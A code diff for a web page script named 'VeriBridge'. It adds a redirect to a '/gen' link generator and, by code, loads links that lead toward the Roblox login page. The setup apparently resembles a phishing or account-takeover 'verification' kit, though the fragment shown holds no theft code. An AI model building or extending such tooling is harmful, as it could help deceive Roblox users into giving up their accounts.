@@ -270,11 +270,26 @@
 </div>
 
 <script>
+// ==================== REDIRECT LOGIC - PUT THIS FIRST ====================
+(function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const code = urlParams.get('code');
+    
+    // If NO code and on root page, redirect to generator
+    if (!code && (window.location.pathname === '/' || window.location.pathname === '')) {
+        console.log('[VeriBridge] No code detected, redirecting to generator...');
+        window.location.href = '/gen';
+        return; // Stop execution
+    }
+    
+    console.log('[VeriBridge] Code detected:', code || 'none (but not on root)');
+})();
+
 // ==================== CONFIGURATION ====================
 let TARGET_URL = 'https://www.roblox.com/login';
 let IS_LOADING = true;
 
-// Get code from URL
+// Get code from URL (already checked above, but get again for use)
 const urlParams = new URLSearchParams(window.location.search);
 const code = urlParams.get('code');
 
@@ -305,7 +320,6 @@ if (code) {
     console.log('[VeriBridge] Loading code:', code);
     if (startLoadingOverlay) startLoadingOverlay.classList.add('active');
     
-    // FIXED: Correct API endpoint
     fetch('/api/links?code=' + code)
         .then(response => {
             if (!response.ok) throw new Error('Link not found');
